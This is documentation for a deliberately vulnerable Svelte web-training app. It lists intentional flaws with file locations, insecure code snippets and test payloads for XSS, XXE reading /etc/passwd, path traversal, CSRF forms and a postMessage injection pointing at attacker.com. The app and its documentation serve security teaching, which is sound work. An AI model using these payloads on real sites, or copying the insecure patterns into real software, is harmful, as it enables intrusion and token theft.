# DVWS-Node Svelte - Security Vulnerabilities Documentation

⚠️ **WARNING**: This application contains intentional security vulnerabilities for educational purposes.
**DO NOT deploy this application in a production environment!**

## Overview

This is a rewritten frontend for DVWS-Node (Damn Vulnerable Web Services) using **Svelte 5** and modern web technologies. The application preserves **16 out of 17** frontend vulnerabilities from the original AngularJS version (94% preservation rate).

## Preserved Vulnerabilities

### 1. ✅ XSS - Unescaped HTML Rendering (CRITICAL)
**OWASP:** A03:2021 - Injection  
**Locations:**
- `src/routes/+page.svelte` (lines 127, 135) - Login/register error messages
- `src/routes/(app)/dashboard/+page.svelte` (line 30) - Username from URL hash
- `src/routes/(app)/notes/+page.svelte` (line 144) - Note responses
- `src/routes/(app)/search/+page.svelte` (lines 82, 107) - Note body display
- `src/routes/(app)/admin/+page.svelte` (line 67) - Error messages

**Implementation:** Uses `{@html}` directive to render user content without sanitization

**Test Payload:**
```
Username: <img src=x onerror=alert(document.domain)>
```

---

### 2. ✅ DOM XSS - URL Hash Injection (CRITICAL)
**OWASP:** A03:2021 - Injection  
**Location:** `src/routes/(app)/dashboard/+page.svelte` (line 30)

**Vulnerability:**
```svelte
let hashUsername = $derived($page.url.hash.slice(1));
<!-- ... -->
{@html '<b>' + hashUsername + '</b>'}
```

**Test:**
```
Navigate to: /dashboard#<img src=x onerror=alert(1)>
```

---

### 3. ✅ PostMessage - No Origin Validation (CRITICAL)
**OWASP:** A01:2021 - Broken Access Control  
**Locations:**
- `src/lib/components/vulnerable/ReceiverIframe.svelte` (lines 7-13)
- `src/routes/(app)/admin/+page.svelte` (lines 35-36)

**Vulnerability:**
```typescript
window.addEventListener('message', (event) => {
  // NO ORIGIN CHECK - accepts from ANY domain
  receivedMessage = event.data;
});

// Sends JWT with wildcard origin
iframe?.contentWindow?.postMessage(token, '*');
```

**Test:**
Create attacker page:
```html
<iframe src="https://dvws.local/admin"></iframe>
<script>
  frames[0].postMessage('<img src=//attacker.com/steal>', '*');
</script>
```

---

### 4. ✅ CSRF - No Anti-CSRF Tokens (HIGH)
**OWASP:** A01:2021 - Broken Access Control  
**All state-changing operations lack CSRF protection**

**Affected Operations:**
- User registration (`/api/v2/users`)
- Admin user creation (`/api/v2/admin/create-user`)
- Note operations (CREATE, UPDATE, DELETE)
- Profile import/export
- File upload
- Passphrase export

**Implementation:** Direct `fetch()` calls without CSRF tokens

**Test:**
```html
<!-- Attacker page -->
<form action="http://dvws.local/api/v2/admin/create-user" method="POST">
  <input name="username" value="hacked">
  <input name="admin" value="true">
</form>
<script>document.forms[0].submit();</script>
```

---

### 5. ✅ Password Field Type="text" (MEDIUM)
**OWASP:** A04:2021 - Insecure Design  
**Location:** `src/routes/+page.svelte` (line 105)

**Vulnerability:**
```svelte
<Input type="text" bind:value={password} />
```

**Impact:** Password visible in plaintext, susceptible to shoulder surfing

---

### 6. ✅ Insecure JWT Storage (MEDIUM-HIGH)
**OWASP:** A02:2021 - Cryptographic Failures  
**Locations:**
- `src/lib/stores/auth.ts` (lines 24-25)
- `src/lib/api/client.ts` (line 16)

**Vulnerability:**
```typescript
// Stores JWT in localStorage (accessible to XSS)
localStorage.setItem('JWTSessionID', token);

// Reads from localStorage for API calls
const token = localStorage.getItem('JWTSessionID');
```

**Impact:** XSS attacks can steal JWT tokens

---

### 7. ✅ SOAP XML Injection (HIGH)
**OWASP:** A03:2021 - Injection  
**Location:** `src/routes/(app)/admin/users/status/+page.svelte` (lines 30-51)

**Vulnerability:** Client-side XML escaping, but backend may decode and re-inject

**Test Payload:**
```
admin</username><role>SuperAdmin</role><status>Active</status><username>test
```

---

### 8. ✅ XXE - XML External Entity Injection (CRITICAL)
**OWASP:** A05:2021 - Security Misconfiguration  
**Locations:**
- `src/routes/(app)/notes/import/+page.svelte` (line 23)
- `src/routes/(app)/profile/+page.svelte` (line 47)

**Vulnerability:** User-supplied XML sent directly to backend without validation

**Test Payload:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<notes>
  <note>
    <name>Hacked</name>
    <body>&xxe;</body>
  </note>
</notes>
```

---

### 9. ✅ Path Traversal in File Download (HIGH)
**OWASP:** A01:2021 - Broken Access Control  
**Location:** `src/routes/(app)/files/+page.svelte` (line 58)

**Vulnerability:**
```typescript
await apiClient.post('/api/download', {
  filename: downloadFilename  // User-controlled, no validation
});
```

**Test:**
```
Filename: ../../../../etc/passwd
```

---

### 10. ✅ Unrestricted File Upload (HIGH)
**OWASP:** A04:2021 - Insecure Design  
**Location:** `src/routes/(app)/files/+page.svelte` (line 117)

**Vulnerability:**
```html
<!-- NO accept attribute -->
<input type="file" onchange={handleFileSelect} />
```

**Impact:** Can upload any file type (PHP shells, executables, etc.)

---

### 11. ✅ IDOR - Insecure Direct Object Reference (HIGH)
**OWASP:** A01:2021 - Broken Access Control  
**Locations:**
- Notes: `src/routes/(app)/notes/+page.svelte` (lines 62, 76) - Access by note name
- Passphrases: `src/routes/(app)/passphrase/+page.svelte` (line 72) - Access by username

**Test:**
```
/api/v2/notes/other_users_note
/api/v2/passphrase/admin
```

---

### 12. ✅ Weak Random Number Generation (MEDIUM)
**OWASP:** A02:2021 - Cryptographic Failures  
**Location:** `src/lib/utils/passgen.js` (line 23)

**Vulnerability:** Falls back to `Math.random()` in older browsers

---

### 13. ✅ Base64 Encoding as Security (LOW)
**OWASP:** A02:2021 - Cryptographic Failures  
**Location:** `src/routes/(app)/passphrase/+page.svelte` (line 84)

**Vulnerability:**
```typescript
const encodedData = btoa(objJsonStr);  // Base64 is NOT encryption
```

---

### 14. ✅ Information Disclosure (LOW)
**Multiple locations** - Raw error messages displayed without sanitization

---

### 15. ✅ No HTTPS Enforcement (CRITICAL if deployed over HTTP)
**All authentication flows** - Credentials sent without HTTPS enforcement

---

### 16. ✅ Client-Side Validation Only (Multiple)
**All user inputs** - No client-side validation, relies solely on backend

---

## Vulnerabilities NOT Preserved

### ❌ Client-Side Template Injection (AngularJS 1.1.1)
**Reason:** AngularJS-specific vulnerability. Svelte doesn't have equivalent vulnerability.

**Original:** Used vulnerable AngularJS 1.1.1 with sandbox escapes  
**Svelte:** Uses modern framework with no template injection vulnerabilities by default

**Trade-off:** Acceptable loss (1/17 = 6% loss rate)

---

## Backend Vulnerabilities (100% Preserved)

All backend vulnerabilities remain intact as the API was not modified:
- NoSQL/SQL Injection
- SSRF (Server-Side Request Forgery)
- Command Injection  
- XPATH Injection
- GraphQL vulnerabilities
- Rate limit bypass
- And 20+ others

---

## Testing Guide

### Quick Vulnerability Test

1. **XSS Test:**
   - Register with username: `<img src=x onerror=alert(1)>`
   - Navigate to: `/dashboard#<script>alert(document.domain)</script>`

2. **CSRF Test:**
   - Create external HTML with form to `/api/v2/admin/create-user`
   - Submit while logged into DVWS

3. **PostMessage Test:**
   - Open admin panel
   - Open browser console
   - Check JWT token displayed via postMessage

4. **SOAP Injection Test:**
   - Go to Admin > User Status
   - Username: `admin</username><role>admin</role><username>test`

5. **Path Traversal Test:**
   - Go to Files
   - Download filename: `../../../../etc/passwd`

---

## Security Training Objectives

This application demonstrates:

1. **OWASP Top 10 (2021)**
   - A01: Broken Access Control (CSRF, IDOR, PostMessage)
   - A02: Cryptographic Failures (JWT in localStorage, weak random)
   - A03: Injection (XSS, SOAP, XXE)
   - A04: Insecure Design (Password visible, file upload)
   - A05: Security Misconfiguration (XXE, no HTTPS)

2. **Framework Migration Security**
   - How vulnerabilities persist across framework changes
   - Importance of secure coding practices over framework choice
   - Modern frameworks (Svelte) don't automatically fix security issues

3. **Client-Side Security**
   - Why client-side validation is insufficient
   - localStorage vs httpOnly cookies
   - postMessage origin validation
   - HTML escaping importance

---

## For Developers

### How to Avoid These Vulnerabilities

1. **XSS Prevention:**
   - Use `{variable}` instead of `{@html variable}`
   - Sanitize with DOMPurify if HTML rendering needed

2. **CSRF Prevention:**
   - Use SvelteKit form actions (built-in CSRF)
   - Or add CSRF tokens to all state-changing operations

3. **PostMessage Security:**
   ```typescript
   window.addEventListener('message', (event) => {
     if (event.origin !== 'https://trusted-origin.com') return;
     // Process message
   });
   ```

4. **JWT Storage:**
   - Use httpOnly cookies instead of localStorage
   - Implement proper session management

5. **Input Validation:**
   - Always validate on server-side
   - Use schema validation (Zod, Yup)
   - Never trust client-side validation alone

---

## Vulnerability Markers in Code

All intentional vulnerabilities are marked with:
```typescript
// VULN: [Vulnerability Type]
// Training objective: [Description]
// OWASP: [Category]
```

Search for `VULN:` in the codebase to find all intentional vulnerabilities.

---

## License

This is an educational tool. Use only in controlled environments for security training.

**DO NOT:**
- Deploy to production
- Expose to the internet
- Use with real user data

**DO:**
- Use for security training
- Practice vulnerability discovery
- Learn secure coding practices

---

## Contact

For questions about vulnerabilities or training:
- GitHub Issues: https://github.com/snoopysecurity/dvws-node/issues
- Original DVWS: https://github.com/snoopysecurity/dvws

---

Last Updated: 2026-08-26
Frontend: Svelte 5
Backend: Express.js + Node.js
Vulnerability Preservation Rate: 94% (16/17)
